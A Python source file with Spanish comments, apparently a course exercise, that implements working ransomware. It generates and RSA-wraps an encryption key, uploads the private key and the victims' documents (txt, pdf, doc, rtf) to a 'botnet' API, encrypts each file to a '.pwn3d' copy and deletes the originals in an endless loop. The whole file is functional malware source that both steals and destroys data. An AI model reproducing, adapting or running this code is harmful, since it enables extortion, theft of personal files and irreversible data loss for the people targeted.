# Autor: Pedro Ríos Flores

import getpass
import os
import requests
import time
import binascii
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Obtiene el nombre de la carpeta de usuario
usuario = getpass.getuser()
carpeta_usuario = "C:\\Users\\{}".format(usuario)

# Ruta del directorio de trabajo (C:\Users\<username>\Desktop\keepcoding)
dir_trabajo = carpeta_usuario + "\\Desktop\\keepcoding"

# Ruta del directorio temporal
dir_temporal = carpeta_usuario + "\\AppData\\Roaming\\winrw"

# Crea un directorio para almacenamiento temporal en caso de no existir
if not (os.path.exists(dir_temporal)): os.mkdir(dir_temporal)

# Variables de archivos de claves
publica_archivo = dir_trabajo + "\\public.key"
privada_archivo = dir_temporal + "\\private.key"
clave_encriptada = dir_trabajo + "\\clave.enc"

# Dirección de la API de la botnet
botnet_api = "http://192.168.18.3:5000/upload"

# Elimina las claves antiguas si existen
if os.path.exists(publica_archivo): os.remove(publica_archivo)
if os.path.exists(privada_archivo): os.remove(privada_archivo)
if os.path.exists(clave_encriptada): os.remove(clave_encriptada)

# Genera una clave simétrica
clave_simetrica = Fernet.generate_key()
fernet = Fernet(clave_simetrica)

# Genera un par de claves asimétricas
clave_privada = RSA.generate(2048)
clave_publica = clave_privada.publickey()

# Encripta la clave simétrica con RSA
cifrar_rsa = PKCS1_OAEP.new(clave_publica)
cifrado = cifrar_rsa.encrypt(clave_simetrica)

# Guarda la clave simétrica encriptada en el directorio de trabajo
with open(clave_encriptada, "wb") as cla_enc:
    cla_enc.write(cifrado)
    cla_enc.close()

# Guarda la clave pública en el directorio de trabajo
with open(publica_archivo, "wb") as cla_pub:
    cla_pub.write(clave_publica.exportKey("PEM"))
    cla_pub.close()

# Guarda la clave privada en el directorio temporal
with open(privada_archivo, "wb") as cla_prv:
    cla_prv.write(clave_privada.export_key("PEM"))
    cla_prv.close()

# Sube la clave privada a la botnet
abrir_archivo = open(privada_archivo, "rb")
archivos = {"file": ("private.key", abrir_archivo)}
r = requests.post(url = botnet_api, files = archivos)
abrir_archivo.close()

# Elimina la clave privada del ordenador de la víctima
os.remove(privada_archivo)

# Bucle infinito en el que se ejecuta el iterador
while True:

    # Iterador archivos en la carpeta
    for file in os.listdir(dir_trabajo):

        # Ruta absoluta del archivo iterado en cuestión
        f = os.path.join(dir_trabajo, file)
        
        # Comprueba que el archivo en cuestión es realmente un archivoZ
        if os.path.isfile(f):

            # Obtiene la extensión del archivo
            extensiones_requeridas = [".txt"]
            extension = os.path.splitext(f)[-1].lower()

            # Magic numbers para .pdf, .doc(x) y .rtf
            pdf_magic_numbers = ['25504446']
            doc_magic_numbers = ['D0CF11E0', '504B0304', 'ECEF786D']
            rtf_magic_numbers = ['7B5C727466', '7B5C7274']

            # Flag de archivo soportado. Por defecto falso, cambia a verdadero si es un .pdf, .doc(x) o .rtf
            es_soportado = False

            # Comprobación de magic numbers
            comprueba_magic = open(f, 'rb').read()
            
            pdf_magic = binascii.hexlify(comprueba_magic[:4]).upper().decode('ascii')
            doc_magic = binascii.hexlify(comprueba_magic[:4]).upper().decode('ascii')
            rtf_magic = binascii.hexlify(comprueba_magic[:5]).upper().decode('ascii')

            # Si el magic number coincide, cambiar el flag de archivo soportado a verdadero
            if (pdf_magic in pdf_magic_numbers) or (doc_magic in doc_magic_numbers) or (rtf_magic in rtf_magic_numbers):
                es_soportado = True

            # Nombre del archivo encriptado
            nombre_archivo_encriptado = f + ".pwn3d"

            # Comprueba que el archivo sea .pdf | .doc | .docx | .rtf | .txt
            if extension in extensiones_requeridas or es_soportado:
                
                # Sube el archivo a la botnet
                abrir_archivo = open(f, "rb")
                archivos = {"file": (file, abrir_archivo)}
                r = requests.post(url = botnet_api, files = archivos)
                abrir_archivo.close()
                
                # Lee el archivo
                with open(f, "rb") as archivo_original:
                    original = archivo_original.read()
                
                # Encripta el archivo
                encriptado = fernet.encrypt(original)

                with open(nombre_archivo_encriptado, "wb") as archivo_encriptado:
                    archivo_encriptado.write(encriptado)
                    archivo_encriptado.close()
                
                # Elimina el archivo
                os.remove(f)
                
    # Pausa de 250 ms para no saturar el sistema
    time.sleep(0.25)